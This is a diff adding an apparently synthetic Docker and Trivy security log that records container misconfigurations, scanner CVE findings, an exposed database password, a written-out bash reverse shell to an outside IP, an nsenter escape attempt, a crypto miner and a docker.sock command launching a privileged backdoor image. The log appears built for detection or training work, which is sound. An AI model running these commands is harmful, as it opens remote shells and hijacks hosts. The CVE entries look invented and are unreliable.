@@ -1,0 +1,26 @@
+[2024-03-24 20:00:00] INFO docker: Container started | container_id=a1b2c3d4e5f6 | image=webapp:latest | name=production-web | user=root | privileged=true
+[2024-03-24 20:00:05] WARN docker: Container running as root | container_id=a1b2c3d4e5f6 | recommendation=use_non_root_user | severity=MEDIUM
+[2024-03-24 20:00:10] CRITICAL docker: Privileged mode enabled | container_id=a1b2c3d4e5f6 | risk=full_host_access | recommendation=remove_privileged_flag
+[2024-03-24 20:00:15] ERROR docker: Host filesystem mounted | container_id=a1b2c3d4e5f6 | mount=/:/host | mode=rw | risk=host_compromise
+[2024-03-24 20:00:20] WARN docker: Sensitive file mounted | container_id=a1b2c3d4e5f6 | mount=/var/run/docker.sock:/var/run/docker.sock | risk=container_escape
+[2024-03-24 20:01:00] INFO trivy: Vulnerability scan started | image=webapp:latest | scanner=trivy
+[2024-03-24 20:01:30] CRITICAL trivy: Critical vulnerability found | CVE=CVE-2024-1234 | package=openssl | version=1.1.1k | fixed_version=1.1.1w | severity=CRITICAL | CVSS=9.8
+[2024-03-24 20:01:31] HIGH trivy: High severity vulnerability | CVE=CVE-2023-9876 | package=nginx | version=1.18.0 | fixed_version=1.20.2 | severity=HIGH | CVSS=7.5
+[2024-03-24 20:01:32] HIGH trivy: Remote code execution vulnerability | CVE=CVE-2023-5678 | package=python | version=3.8.10 | fixed_version=3.8.18 | severity=HIGH | CVSS=8.1
+[2024-03-24 20:01:33] MEDIUM trivy: Medium severity vulnerability | CVE=CVE-2023-4321 | package=libssl1.1 | version=1.1.1f | fixed_version=1.1.1u | severity=MEDIUM | CVSS=5.3
+[2024-03-24 20:01:34] CRITICAL trivy: SQL injection vulnerability | CVE=CVE-2024-0001 | package=postgresql-client | version=12.2 | fixed_version=12.15 | severity=CRITICAL | CVSS=9.1
+[2024-03-24 20:02:00] ERROR docker: Secret exposed in environment variable | container_id=a1b2c3d4e5f6 | variable=DATABASE_PASSWORD | value=prod_pass_12345 | recommendation=use_secrets_management
+[2024-03-24 20:02:05] WARN docker: API key exposed | container_id=a1b2c3d4e5f6 | variable=AWS_SECRET_ACCESS_KEY | recommendation=use_IAM_roles
+[2024-03-24 20:02:10] ERROR docker: Hardcoded credentials detected | container_id=a1b2c3d4e5f6 | file=/app/config.py | line=45 | credential_type=database_password
+[2024-03-24 20:03:00] WARN docker: Outdated base image | image=webapp:latest | base_image=ubuntu:18.04 | status=end_of_life | last_update=2023-05-31 | recommendation=upgrade_to_22.04
+[2024-03-24 20:03:30] INFO docker: Network activity detected | container_id=a1b2c3d4e5f6 | destination=185.220.101.150:4444 | protocol=TCP | flag=suspicious_port
+[2024-03-24 20:03:35] CRITICAL docker: Reverse shell connection | container_id=a1b2c3d4e5f6 | command="bash -i >& /dev/tcp/185.220.101.150/4444 0>&1" | status=ACTIVE
+[2024-03-24 20:04:00] ERROR docker: Container escape attempt | container_id=a1b2c3d4e5f6 | technique=nsenter | target_namespace=host | status=BLOCKED
+[2024-03-24 20:04:30] WARN docker: Excessive CPU usage | container_id=a1b2c3d4e5f6 | cpu_percent=95 | duration_minutes=5 | pattern=crypto_mining_suspected
+[2024-03-24 20:05:00] CRITICAL docker: Cryptocurrency miner detected | container_id=a1b2c3d4e5f6 | process=xmrig | pool=mining.pool.com:3333 | wallet=suspicious
+[2024-03-24 20:05:30] ERROR docker: Unauthorized image pull | user=anonymous | image=malicious/backdoor:latest | registry=unknown.registry.io | status=SUCCESS
+[2024-03-24 20:06:00] WARN docker: Container running without resource limits | container_id=a1b2c3d4e5f6 | memory_limit=unlimited | cpu_limit=unlimited | risk=resource_exhaustion
+[2024-03-24 20:06:30] ERROR docker: Capability granted | container_id=a1b2c3d4e5f6 | capability=SYS_ADMIN | risk=kernel_access | recommendation=drop_unnecessary_capabilities
+[2024-03-24 20:07:00] CRITICAL docker: Container spawned from compromised image | container_id=b2c3d4e5f6g7 | image=webapp:latest | parent_container=a1b2c3d4e5f6 | flag=lateral_movement
+[2024-03-24 20:07:30] ERROR docker: Docker daemon accessed from container | container_id=a1b2c3d4e5f6 | socket=/var/run/docker.sock | command="docker run -d --privileged backdoor:latest"
+[2024-03-24 20:08:00] ALERT docker: Multiple containers started rapidly | count=20 | time_window_seconds=30 | pattern=botnet_deployment | action=INVESTIGATION_REQUIRED
